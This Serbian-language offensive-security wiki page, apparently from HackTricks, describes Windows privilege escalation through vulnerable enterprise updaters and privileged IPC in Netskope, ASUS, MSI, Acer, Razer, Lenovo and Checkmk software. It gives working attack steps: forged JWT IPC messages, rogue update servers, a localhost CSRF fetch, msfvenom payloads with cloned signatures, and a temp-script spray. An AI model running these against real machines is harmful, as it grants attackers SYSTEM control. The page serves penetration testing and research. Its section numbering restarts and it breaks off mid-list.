# Zloupotreba enterprise automatskih ažuriranja i privilegovanog IPC-a (npr., Netskope, ASUS i MSI)

{{#include ../../banners/hacktricks-training.md}}

Ova stranica uopšteno opisuje klasu lanaca lokalne eskalacije privilegija u Windowsu, pronađenih u enterprise agentima za krajnje tačke i programima za ažuriranje koji izlažu IPC površinu sa malim preprekama za pristup i privilegovani tok ažuriranja. Reprezentativan primer je Netskope Client za Windows < R129 (CVE-2025-0309), gde korisnik sa niskim privilegijama može da primora proces registracije da se poveže sa serverom pod kontrolom napadača, a zatim isporuči zlonamerni MSI koji instalira SYSTEM servis.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Ključne ideje koje možete primeniti protiv sličnih proizvoda:
- Zloupotrebite localhost IPC privilegovanog servisa da biste primorali ponovnu registraciju ili rekonfiguraciju ka serveru napadača.
- Implementirajte krajnje tačke za ažuriranje dobavljača, isporučite lažni Trusted Root CA i usmerite program za ažuriranje na zlonamerni „potpisani“ paket.
- Zaobiđite slabe provere potpisnika (liste dozvoljenih CN vrednosti), opcione zastavice za digest i previše labava MSI svojstva.
- Ako je IPC „šifrovan“, izvedite ključ/IV iz identifikatora mašine čitljivih svima, koji su sačuvani u registru.
- Ako servis ograničava pozivaoce prema putanji izvršne datoteke/nazivu procesa, ubacite kod u proces sa liste dozvoljenih ili pokrenite takav proces u suspendovanom stanju i učitajte svoju DLL biblioteku minimalnom izmenom konteksta niti.

Prilagođene lokalne TCP usluge zahtevaju istu proveru identiteta i granica ulaza, čak i kada traže PIN ili druge akreditive aplikacije. Utvrdite koji proces koristi port, koji je efektivni nalog servisa, a zatim proverite tačno implementiranu binarnu datoteku/verziju i da li se polja pod kontrolom pozivaoca proveravaju prema dužini pre kopiranja u bafere fiksne veličine ili upotrebe za sastavljanje komande podređenog procesa. [Microsoft-ove smernice o prekoračenju bafera](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) objašnjavaju zašto je neproveren spoljašnji unos opasan u privilegovanom izvornom kodu. Loopback listener, hardkodovani akreditiv ili samo naziv procesa ne dokazuju oštećenje memorije niti izvršavanje kao SYSTEM; dostupnost, autorizacija, putanja izvršavanja koda i mere za ublažavanje rizika i dalje su zasebni uslovi. Uobičajeno enumerisanje obavljajte pasivno, umesto da servisu uživo šaljete ulaze dužine koja može izazvati pad.

---
## 1) Primoravanje registracije na server napadača putem localhost IPC-a

Mnogi agenti isporučuju korisnički UI proces koji komunicira sa SYSTEM servisom preko localhost TCP-a koristeći JSON.

Zapaženo u Netskope:
- UI: stAgentUI (nizak integritet) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Tok eksploatacije:
1) Napravite JWT token za registraciju čiji claim-ovi određuju host backend-a (npr., AddonUrl). Koristite alg=None da potpis ne bi bio potreban.
2) Pošaljite IPC poruku koja poziva komandu za registraciju sa vašim JWT-om i nazivom tenant-a:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Servis počinje da šalje zahteve vašem rogue serveru za enrollment/config, npr.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Napomene:
- Ako se provera pozivaoca zasniva na putanji/nazivu, pošaljite zahtev iz allow-listed binarne datoteke dobavljača (pogledajte §4).<sup>[[1]](#references)[[2]](#references)</sup>

### Management IPC izložen mreži

Ova granica poverenja nije uvek ograničena na localhost. U prijavljenom slučaju MyReport Updater 2.1.1, servis `LocalSystem` osluškivao je na svim interfejsima i prihvatao neautentifikovanu gRPC promenu konfiguracije za referentni host, port i režim rada. Za udaljenu varijantu bio je potreban i mrežni pristup listeneru i odlazni pristup servisa do izabranog referentnog hosta. Procenite ovo odvojeno od toga da li kasniji tok paketa može da pređe granicu upisa datoteka.<sup>[[16]](#references)</sup>

---
## 2) Hijacking update kanala radi pokretanja koda kao SYSTEM

Kada klijent počne da komunicira sa vašim serverom, implementirajte očekivane endpoint-e i usmerite ga ka MSI-ju napadača. Tipičan sled:

1) /v2/config/org/clientconfig → Vratite JSON konfiguraciju sa veoma kratkim intervalom update-a, npr.:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Vratiti PEM CA sertifikat. Servis ga instalira u Local Machine Trusted Root store.
3) /v2/checkupdate → Dostaviti metapodatke koji upućuju na zlonamerni MSI i lažnu verziju.

Zaobilaženje uobičajenih provera koje se sreću u praksi:
- Allow-list potpisnika prema CN-u: servis može samo da proverava da li je Subject CN jednak „netSkope Inc” ili „Netskope, Inc.”. Vaš rogue CA može da izda leaf sa tim CN-om i potpiše MSI.
- CERT_DIGEST svojstvo: uključite bezopasno MSI svojstvo pod nazivom CERT_DIGEST. Ne sprovodi se provera pri instalaciji.
- Opciona provera digest-a: konfiguraciona zastavica (npr. check_msi_digest=false) isključuje dodatnu kriptografsku validaciju.

Rezultat: SYSTEM servis instalira vaš MSI iz
C:\ProgramData\Netskope\stAgent\data\*.msi
i izvršava proizvoljan kod kao NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Pouka o zaobilaženju zakrpa: ako dobavljač kao odgovor uvede allow-listu malog broja „pouzdanih” domena umesto da kriptografski autentifikuje izvor ažuriranja, potražite preusmerivače ili reverse proxy-je u vlasništvu dobavljača koji vam i dalje omogućavaju da usmeravate saobraćaj. U slučaju Netskope-a, javna naknadna istraživanja pokazala su da se allow-lista iz ere R129 i dalje mogla zloupotrebiti preko `rproxy.goskope.com`, koji je prosleđivao sadržaj Azure App Service-a pod kontrolom napadača. Posmatrajte allow-liste imena hostova kao prepreku koja usporava, a ne kao granicu poverenja.<sup>[[14]](#references)</sup>

Drugi način otkaza su **dosledni, ali neautentifikovani metapodaci paketa**. U slučaju MyReport-a, referenca pod kontrolom napadača posluživala je izmenjenu arhivu, dok je posrednik menjao MD5 digest i veličinu dobavljača pre nego što bi ti odgovori stigli do updater-a. Poklapanjem tih vrednosti proveravala se doslednost odgovora, a ne poreklo od dobavljača; MD5 kolizija nije bila potrebna. Direktorijum za instalaciju koji je odredio pozivalac zatim je omogućio da privilegovana ekstrakcija postane granica za upis datoteka. Dobijeni primitiv za učitavanje DLL-ova obrađen je u odeljku [lančano povezivanje proizvoljnog upisa datoteke sa DLL hijacking-om](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack).<sup>[[16]](#references)</sup>

---
## 3) Falsifikovanje šifrovanih IPC zahteva (kada postoje)

Od verzije R127, Netskope je IPC JSON umotavao u polje encryptData koje izgleda kao Base64. Reverse engineering je pokazao AES sa ključem/IV vrednostima izvedenim iz stavki registratora koje može da čita svaki korisnik:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Napadači mogu da reprodukuju šifrovanje i šalju ispravne šifrovane komande sa standardnog korisničkog naloga.<sup>[[1]](#references)[[2]](#references)</sup> Opšti savet: ako agent odjednom počne da „šifruje” svoj IPC, potražite ID-jeve uređaja, product GUID-ove i install ID-jeve u HKLM koji se koriste kao materijal.

---
## 4) Zaobilaženje IPC allow-lista pozivalaca (provere putanje/imena)

Neki servisi pokušavaju da autentifikuju peer tako što utvrđuju PID TCP veze i porede putanju/ime slike procesa sa allow-listom izvršnih datoteka dobavljača koje se nalaze u Program Files (npr. stagentui.exe, bwansvc.exe, epdlp.exe).

Dva praktična načina zaobilaženja:
- DLL injection u proces sa allow-liste (npr. nsdiag.exe) i prosleđivanje IPC zahteva iz tog procesa.
- Pokretanje izvršne datoteke sa allow-liste u suspendovanom stanju i pokretanje vaše proxy DLL datoteke bez CreateRemoteThread (videti §5), kako bi se zadovoljila pravila zaštite od neovlašćenih izmena koja sprovodi drajver.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Injection uz poštovanje zaštite od neovlašćenih izmena: suspendovani proces + NtContinue patch

Proizvodi često isporučuju minifilter/OB callbacks drajver (npr. Stadrv) koji uklanja opasna prava sa handle-ova ka zaštićenim procesima:
- Proces: uklanja PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Nit: ograničava prava na THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Pouzdan loader u user-mode režimu koji poštuje ova ograničenja:
1) Pozvati CreateProcess za izvršnu datoteku dobavljača sa CREATE_SUSPENDED.
2) Nabaviti handle-ove koji su vam i dalje dozvoljeni: PROCESS_VM_WRITE | PROCESS_VM_OPERATION za proces i handle niti sa THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ili samo THREAD_RESUME ako patch-ujete kod na poznatom RIP-u).
3) Prepisati ntdll!NtContinue (ili drugi thunk koji je rano i garantovano mapiran) malom stub funkcijom koja poziva LoadLibraryW za putanju vaše DLL datoteke, a zatim se vraća nazad.
4) Pozvati ResumeThread da biste pokrenuli stub u procesu и учитали своју DLL датотеку.

Пошто нисте користили PROCESS_CREATE_THREAD или PROCESS_SUSPEND_RESUME над већ заштићеним процесом (ви сте га креирали), политика драјвера је испоштована.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Praktični alati
- NachoVPN (Netskope plugin) automatizuje rogue CA, potpisivanje zlonamernog MSI-ja i posluživanje potrebnih endpoint-a: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope je prilagođeni IPC klijent koji sastavlja proizvoljne IPC poruke (po želji AES-šifrovane) i uključuje injection suspendovanog procesa kako bi poruke poticale iz izvršne datoteke sa allow-liste.<sup>[[4]](#references)</sup>

## 7) Brzi workflow trijaže za nepoznate updater/IPC površine

Kada naiđete na novi endpoint agent ili paket „helper” alata za matičnu ploču, obično je dovoljan brz workflow da utvrdite da li je reč o obećavajućoj meti za privesc:<sup>[[6]](#references)</sup>

1) Nabrojte loopback listenere i povežite ih sa procesima dobavljača:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Izlistajte potencijalne imenovane cevi:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Prikupite podatke o rutiranju pohranjene u registru, koje koriste IPC serveri zasnovani na dodacima:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Najpre izdvojite nazive endpointa, JSON ključeve i ID-jeve komandi iz klijenta u korisničkom režimu. Upakovani Electron/.NET frontendovi često leak-uju celu šemu:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Potražite stvarni uslov poverenja, a ne samo putanju koda koja na kraju pokreće proces:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Obrasci kojima vredi dati prioritet:
- `CryptQueryObject`/parsiranje sertifikata bez `WinVerifyTrust` obično znači da je „sertifikat postoji” tretirano kao „sertifikat je pouzdan”, što omogućava kloniranje sertifikata ili druge trikove s lažnim potpisnikom.
- Provere podniza/sufiksa nad `Origin`, `Referer`, URL-ovima za preuzimanje, nazivima procesa ili CN-ovima potpisnika nisu autentifikacija. `contains(".vendor.com")` je obično moguće zloupotrebiti pomoću domena sličnog izgleda pod kontrolom napadača.
- Ako GUI sa niskim privilegijama odlučuje da je „datoteka pouzdana”, a SYSTEM broker samo koristi taj rezultat, izmena ili ponovna implementacija klijentske DLL/JS komponente često u potpunosti zaobilazi granicu (podeljena validacija u stilu Razer-a).
- Ako broker kopira payload u `%TEMP%`/`C:\Windows\Temp`, a zatim ga validira ili zakazuje sa te putanje, odmah proverite mogućnosti za TOCTOU zamenu i postoje li susedni moduli dodataka koji izlažu alternativne omotače `ExecuteTask()` sa slabijim proverama.<sup>[[6]](#references)</sup>

Za mete koje intenzivno koriste imenovane cevi, PipeViewer je brz način da uočite slabe DACL-ove i cevi dostupne sa udaljenih sistema pre nego što počnete detaljno da analizirate protokol.<sup>[[11]](#references)</sup>

Ako meta autentifikuje pozivaoce samo pomoću PID-a, putanje slike ili naziva procesa, smatrajte to preprekom koju je lako preći, a ne granicom: često je dovoljno ubrizgati kod u legitimni klijent ili uspostaviti vezu iz procesa na listi dozvoljenih da bi se zadovoljile provere servera. Za imenovane cevi posebno, [ova stranica o impersonaciji klijenta i zloupotrebi cevi](named-pipe-client-impersonation.md) detaljnije obrađuje ovaj mehanizam.

Kod privilegovanog **brokera za čišćenje ili vraćanje**, proverite granicu poverenja putanja, kao i ACL cevi. Pozivalac sa nižim privilegijama možda može da izabere odredište vraćanja ili preimenuje pripremljeni rezervni artefakt u deljenom direktorijumu, čak i kada su izvršna datoteka servisa i njen instalacioni direktorijum zaštićeni. Zasebno potvrdite da pozivalac može da dođe do komande za vraćanje, da može da izmeni tačno određeni pripremljeni ulaz ili naziv datoteke, da se broker izvršava pod identitetom sa višim privilegijama i da njegova operacija vraćanja zaista upisuje podatke na izabranu zaštićenu putanju. Direktorijum za pripremu sa dozvolom za upis ili cev koja se može čitati sami po sebi ne dokazuju mogućnost proizvoljnog privilegovanog upisa; mapiranje odredišta i ponašanje servisa treba pregledati u kodu ili proveriti kontrolisanim testiranjem. Tokom pasивnog prikupljanja informacija nemojte pozivati nepoznatu komandu za čišćenje, jer može izbrisati корисничке датотеке.

---
## 8) Modularni brokeri dodataka autentifikovani samo potpisima dobavljača (obrazac Lenovo Vantage)

Novija varijanta vredna istraživanja je **RPC broker sa potpisanim klijentom**: desktop proces Lenovo potpisanog softvera sa niskim privilegijama komunicira sa SYSTEM servisom, a servis prosleđuje JSON komande skupu dodataka opisanih XML datotekama u `%ProgramData%`. Kada se izvršavanje koda postigne **unutar bilo kog prihvaćenog potpisanog klijenta**, svaki ugovor sa `runas="system"` postaje deo površine za napad.<sup>[[15]](#references)</sup>

Visokovredni mehanizmi uočeni tokom istraživanja Lenovo Vantage-a:
- **Poverenje pozivaocu zato što ga je potpisao dobavljač**: istraživači su došli do autentifikovanog konteksta tako što su kopirali Lenovo potpisanu EXE datoteku u direktorijum sa dozvolom za upis i zadovoljili uslov za DLL side-load (`profapi.dll`), čime se proizvoljan kod izvršio unutar klijenta kojem je servis već verovao.
- **Otkrivanje površine za napad na osnovu manifesta**: dodatki su deklarisani pod `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; nekoliko ugovora se izvršava kao `SYSTEM`, pa pregled tih manifesta često brže otkriva stvarне privilegovane komande nego analiza samog brokera.
- **Greške po pojedinačnim komandama iza autentifikovanog kanala**: kada su već unutar pouzdanog klijenta, istraživači su u javno dostupnim radovima pronašli path-traversal i race condition greške u komandama za ažuriranje/instalaciju, zloupotrebu raw-SQL-a u privilegovanim bazama postavki i provere putanja registra zasnovane na podnizovima koje su omogućavale upis van predviđenog hive-a.

Korisno izviđanje na meti:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Praktična pouka: kad god helper paket izlaže broker koji najpre autentifikuje **proces pozivaoca**, a tek zatim prosleđuje pozive desetinama komandi dodataka/pluginova, nemojte stati nakon zaobilaženja početne provere poverenja. Izdvojite tabelu manifesta/ugovora i zasebno fuzz-ujte svaku komandu sa visokim privilegijama; autentifikovani kanal obično krije nekoliko propusta u narednoj fazi.

---
## 1) CSRF iz pregledača ka localhost-u protiv privilegovanih HTTP API-ja (ASUS DriverHub)

DriverHub isporučuje HTTP servis u korisničkom režimu (ADU.exe) na adresi 127.0.0.1:53000 koji očekuje pozive pregledača sa adrese https://driverhub.asus.com. Filter za origin jednostavno izvršava `string_contains(".asus.com")` nad zaglavljem Origin i URL-ovima za preuzimanje koje izlaže `/asus/v1.0/*`. Zato svaki host pod kontrolom napadača, kao što je `https://driverhub.asus.com.attacker.tld`, prolazi proveru i može da šalje zahteve koji menjaju stanje pomoću JavaScript-a.<sup>[[6]](#references)</sup> Pogledajte [osnove CSRF-a](../../pentesting-web/csrf-cross-site-request-forgery.md) za dodatne načine zaobilaženja.

Praktičan tok:
1) Registrujte domen koji sadrži `.asus.com` i postavite na njega zlonamernu veb-stranicu.
2) Koristite `fetch` ili XHR za pozivanje privilegovane krajnje tačke (npr. `Reboot`, `UpdateApp`) na `http://127.0.0.1:53000`.
3) Pošaljite JSON telo koje handler očekuje – upakovani frontend JS prikazuje šemu ispod.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Čak i PowerShell CLI prikazan ispod uspešno radi kada se vrednost zaglavlja Origin falsifikuje tako da odgovara pouzdanoj vrednosti:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Svaka poseta sajtu napadača iz pregledača zato postaje lokalni CSRF jednim klikom (ili bez klika putem `onload`), koji pokreće pomoćni program sa privilegijama SYSTEM.

---
## 2) Nesigurna provera potpisa koda i kloniranje sertifikata (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` preuzima proizvoljne izvršne datoteke navedene u JSON telu zahteva i kešira ih u `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Provera URL-a za preuzimanje koristi istu logiku zasnovanu na podnisci, pa se prihvata `http://updates.asus.com.attacker.tld:8000/payload.exe`. Nakon preuzimanja, ADU.exe samo proverava da li PE sadrži potpis i da li se Subject tekst poklapa sa ASUS-om pre pokretanja datoteke — nema `WinVerifyTrust` ni provere lanca sertifikata.

Da biste zloupotrebili ovaj tok:
1) Napravite payload (npr. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Klonirajte potpisnika kompanije ASUS u njega (npr. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Hostujte `pwn.exe` na domenu koji imitira `.asus.com` i pokrenite UpdateApp putem prethodno opisanog CSRF-a iz pregledača.

Pošto su i Origin i URL filteri zasnovani na podniskama, a provera potpisnika samo poredi tekstualne nizove, DriverHub preuzima i izvršava binarnu datoteku napadača u svom kontekstu sa povišenim privilegijama.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU u putanjama za kopiranje/izvršavanje programa za ažuriranje (MSI Center CMD_AutoUpdateSDK)

SYSTEM servis aplikacije MSI Center izlaže TCP protokol u kojem se svaki okvir sastoji od `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Osnovna komponenta (Component ID `0f 27 00 00`) sadrži `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Njegov rukovalac:
1) Kopira prosleđену извршну датотеку у `C:\Windows\Temp\MSI Center SDK.exe`.
2) Proverava potpis putem `CS_CommonAPI.EX_CA::Verify` (Subject sertifikata mora biti jednak “MICRO-STAR INTERNATIONAL CO., LTD.”, a `WinVerifyTrust` mora uspeti).
3) Kreira zakazani zadatak koji pokreće privremenu datoteku kao SYSTEM, uz argumente koje kontroliše napadač.

Kopirana datoteka nije zaključana između provere i poziva `ExecuteTask()`. Napadač može da:
- Pošalje okvir A koji upućuje na legitimnu MSI-potpisanu binarnu datoteku (čime se obezbeđuje prolazak provere potpisa i zakazivanje zadatka).
- U trci pošalje ponavljane poruke okvira B koje upućuju na zlonamerni payload, prepisujući `MSI Center SDK.exe` odmah nakon završetka provere.

Kada se planer aktivira, izvršava prepisani payload pod SYSTEM nalogom, iako je prvobitna datoteka bila validirana. Pouzdana eksploatacija koristi dve goroutine/niti koje neprekidno šalju `CMD_AutoUpdateSDK` dok se ne dobije TOCTOU trka.<sup>[[6]](#references)</sup>

---
## 2) Zloupotreba prilagođenog IPC-a na nivou SYSTEM i impersonation-a (MSI Center + Acer Control Centre)

### TCP skupovi komandi MSI Center-a
- Svaki dodatak/DLL koji učita `MSI.CentralServer.exe` dobija Component ID sačuvan pod `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Prva 4 bajta okvira biraju tu komponentu, što napadačima omogućava da usmeravaju komande ka proizvoljnim modulima.
- Dodaci mogu da definišu sopstvene izvršioce zadataka. `Support\API_Support.dll` izlaže `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` i direktno poziva `API_Support.EX_Task::ExecuteTask()` **bez provere potpisa** — svaki lokalni korisnik može da mu zada `C:\Users\<user>\Desktop\payload.exe` i pouzdano dobije izvršavanje kao SYSTEM.
- Hvatanje loopback saobraćaja pomoću Wireshark-a ili instrumentisanje .NET binarnih datoteka u dnSpy-ju brzo otkriva preslikavanje komponenti i komandi; zatim prilagođeni Go/Python klijenti mogu da ponove okvire.<sup>[[6]](#references)</sup>

### Named pipe-ovi programa Acer Control Centre i impersonation nivoi
- `ACCSvc.exe` (SYSTEM) izlaže `\\.\pipe\treadstone_service_LightMode`, čiji discretionary ACL dozvoljava udaljene klijente (npr. `\\TARGET\pipe\treadstone_service_LightMode`). Slanje ID-a komande `7` uz putanju datoteke poziva rutinu servisa za pokretanje procesa.
- Klijentska biblioteka serijalizuje magični završni bajt (113) zajedno sa argumentima. Dinamičko instrumentisanje pomoću Frida/`TsDotNetLib` (pogledajte [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) za savete o instrumentisanju) pokazuje da nativni rukovalac mapira ovu vrednost na `SECURITY_IMPERSONATION_LEVEL` i SID integriteta pre poziva `CreateProcessAsUser`.
- Zamena vrednosti 113 (`0x71`) sa 114 (`0x72`) preusmerava izvršavanje u generičku granu koja zadržava ceo SYSTEM token i postavlja SID visokog integriteta (`S-1-16-12288`). Pokrenuta binarna datoteka zato radi kao neograničeni SYSTEM, kako lokalno tako i preko druge mašine.
- Uparite ovo sa izloženom instalacionom zastavicom (`Setup.exe -nocheck`) da biste instalirali ACC čak i na laboratorijske virtuelne mašine i testirali pipe bez hardvera proizvođača.<sup>[[6]](#references)</sup>

Ove IPC greške pokazuju zašto localhost servisi moraju da sprovode uzajamnu autentifikaciju (ALPC SID-ove, filtere `ImpersonationLevel=Impersonation` i filtriranje tokena) i zašto svaki modulov pomoćni program za „pokretanje proizvoljne binarne datoteke” mora da koristi iste provere potpisnika.

---
## 3) COM/IPC „elevator” pomoćni programi zasnovani na slaboj validaciji u korisničkom režimu (Razer Synapse 4)

Razer Synapse 4 dodao je još jedan koristan obrazac u ovu grupu: korisnik sa niskim privilegijama može da zatraži od COM pomoćnog programa pokretanje procesa preko `RzUtility.Elevator`, dok se odluka o poverenju prepušta DLL-u u korisničkom režimu (`simple_service.dll`), umesto da se pouzdano sprovodi unutar privilegovane granice.

Uočeni tok eksploatacije:
- Instancirajte COM objekat `RzUtility.Elevator`.
- Pozovite `LaunchProcessNoWait(<path>, "", 1)` da biste zatražili pokретање са повишеним привилегијама.
- У јавном PoC-у, PE-потписни филтер унутар `simple_service.dll` се закрпи и уклони пре слања захтева, чиме се омогућава покретање произвољне извршне датотеке коју одабере нападач.<sup>[[6]](#references)[[10]](#references)</sup>

Минимални PowerShell позив:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Opšti zaključak: pri reverznom inženjeringu „helper” paketa, nemojte se zaustaviti na localhost TCP-u ili imenovanim cevima. Proverite da li postoje COM klase sa imenima kao što su `Elevator`, `Launcher`, `Updater` ili `Utility`, pa utvrdite da li privilegovana usluga zaista sama proverava ciljnu binarnu datoteku ili samo veruje rezultatu koji je izračunao korisnički DLL koji se može izmeniti. Ovaj obrazac se ne odnosi samo na Razer: svaki podeljeni dizajn u kom broker sa visokim privilegijama koristi odluku o dozvoli/odbijanju sa strane sa niskim privilegijama predstavlja moguću površinu za privesc.


---
## Predvidljivo izvršavanje privremene skripte tokom MSI popravke (Checkmk Agent / CVE-2024-0670)

Neki Windows agenti i dalje izvršavaju privilegovane radnje tako što zapisuju privremeni `.cmd` fajl u `C:\Windows\Temp` i pokreću ga kao `SYSTEM`. Ako je naziv fajla predvidljiv, a usluga ne kreira bezbedno novi fajl kada postojeći već postoji, korisnik sa niskim privilegijama može unapred da kreira budući privremeni fajl kao **read-only** i navede privilegovani proces da izvrši sadržaj koji kontroliše napadač, umesto sopstvene skripte.

Uočeno u ranjivim verzijama Checkmk Agent-a:
- obrazac privremenog fajla: `cmk_all_<PID>_1.cmd`
- pogođene grane: `2.0.0`, `2.1.0`, `2.2.0`
- okidač: MSI **repair** keširanog paketa agenta<sup>[[8]](#references)[[9]](#references)</sup>

Praktični postupak:
1. Proceni realističan raspon PID-ova na osnovu trenutnih ID-jeva procesa ili PID-a pokrenutog agenta.
2. Zapiši kratak **ASCII** `.cmd` payload (`Set-Content -Encoding Ascii` ili preusmeravanje izlaza iz `cmd.exe`; izbegavaj UTF-16 PowerShell izlaz za batch fajlove).
3. Uradi spray fajlova `C:\Windows\Temp\cmk_all_<PID>_1.cmd` kroz odabrani raspon i označi svaki fajl kao read-only.
4. Pokreni repair keširanog MSI-ja kako bi privilegovana usluga pokušala da ponovo kreira, a zatim izvrši privremenu skriptu.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Ako je ranjivi proizvod instaliran pomoću Windows Installer-a, utvrdite naziv proizvoda kojem odgovara keširana MSI datoteka nasumičnog naziva u `C:\Windows\Installer` pre pokretanja popravke:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Operativne napomene:
- `qwinsta` je koristan kada `msiexec /fa` ne radi iz neinteraktivne WinRM ljuske i treba da utvrdite da li postojeća desktop/odvojena sesija može pravilno da pokrene popravku.<sup>[[7]](#references)</sup>
- Ovaj obrazac se može primeniti i na druge agentske programe i programe za ažuriranje krajnjih uređaja koji **privremeno smeštaju skripte na lokacije sa dozvolom pisanja za sve, a kasnije ih izvršavaju kao SYSTEM**. Proverite predvidljive nazive, odsustvo semantike ekskluzivnog kreiranja i tokove popravke/ažuriranja koji se mogu pokrenuti na zahtev.

### Interaktivna popravka instalacije i privilegovana konzola

PDF24 Creator 11.15.1 predstavlja zaseban rizik pri popravci MSI-ja: njegova prilagođena akcija za instalaciju štampača može tokom popravke da pokrene vidljivu konzolu sa SYSTEM pravima. Proizvođač je promenio MSI instalacioni program u verziji 11.15.2 da bi otklonio ovo ponašanje. Starija verzija proizvoda samo je trag za trijažu. Proverite registrovani ili dostupan MSI paket, da li ovaj korisnik može da pokrene popravku, da li su prisutni ranjiva prilagođena akcija i kašnjenje pri pisanju u log datoteku, kao i da li interaktivna radna površina može da prikaže konzolu. Prijavljeno kašnjenje koristilo je oplock nad datotekom `faxPrnInst.log`; obična mogućnost pisanja u datoteku nije jedini uslov za pristup. Neinteraktivna ljuska, nedostupan paket ili zakrpljen instalacioni program mogu prekinuti ovaj lanac. Ovaj problem ne zavisi od `AlwaysInstallElevated` i razlikuje se od zamene predvidljive privremene skripte.

---
## Udaljeno otimanje lanca snabdevanja zbog slabe provere programa za ažuriranje (WinGUp / Notepad++)

Između juna 2025. i decembra 2025, napadači koji su kompromitovali hosting infrastrukturu iza toka ažuriranja Notepad++-a selektivno su isporučivali zlonamerne manifeste odabranim žrtvama. Stariji programi za ažuriranje zasnovani na WinGUp-u nisu u potpunosti proveravali autentičnost ažuriranja, pa je zlonameran XML odgovor mogao da preusmeri klijente na URL-ove pod kontrolom napadača. Pošto je klijent prihvatao HTTPS sadržaj bez provere i pouzdanog lanca sertifikata i važećег PE potpisa preuzetog instalacionog programa, žrtve su preuzimale i izvršavale trojanizovani NSIS `update.exe`.<sup>[[12]](#references)[[13]](#references)</sup>

Operativni tok (nije potreban lokalni exploit):
1. **Presretanje infrastrukture**: kompromitujte CDN/hosting i na zahteve za proveru ažuriranja odgovorite metapodacima napadača koji upućuju na zlonamerni URL za preuzimanje.
2. **Trojanizovani NSIS**: instalacioni program preuzima/izvršava payload i zloupotrebljava dva lanca izvršavanja:
